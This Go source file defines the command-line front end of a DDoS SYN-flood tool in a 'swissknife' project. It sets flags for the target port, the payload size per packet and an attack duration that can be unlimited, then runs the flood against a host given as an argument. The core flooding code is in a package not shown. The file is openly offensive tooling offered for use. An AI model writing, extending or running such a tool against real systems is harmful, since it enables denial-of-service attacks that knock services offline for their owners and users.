package swissknife

import (
	"context"
	"syscall"

	signalslistener "github.com/didof/swissknife/internal/signalsListener"
	"github.com/didof/swissknife/synflood"
	"github.com/spf13/cobra"
)

var (
	opts = synflood.GetSynFloodOptions()
)

func init() {
	syncFloodCmd.Flags().IntVarP(&opts.Port, "port", "p", 443, "reachable port of the target") // TODO use icmp to scan all ports of host
	syncFloodCmd.Flags().IntVarP(&opts.PayloadLength, "payload-length", "n", 1400, "payload length in bytes for each SYN packet")
	syncFloodCmd.Flags().IntVarP(&opts.FloodDurationMilliseconds, "flood-duration-md", "d", -1, "duration in milliseconds of the attack. Provide -1 for no limit")
	syncFloodCmd.PersistentFlags().BoolVarP(&opts.Verbose, "verbose", "v", false, "verbose output of the logging library (default false)")
}

var syncFloodCmd = &cobra.Command{
	Use:   "synflood",
	Short: "DDoS SYN-flood on a specific target",
	Long:  "do synflood",
	Args:  cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		ctx := signalslistener.NewSignalsListener(
			syscall.SIGINT,
			syscall.SIGKILL,
			syscall.SIGTERM,
		).Listen(context.Background())

		synflood.Run(ctx, args[0], *opts)
	},
}

func GetSyncFloodCommand() *cobra.Command {
	return syncFloodCmd
}
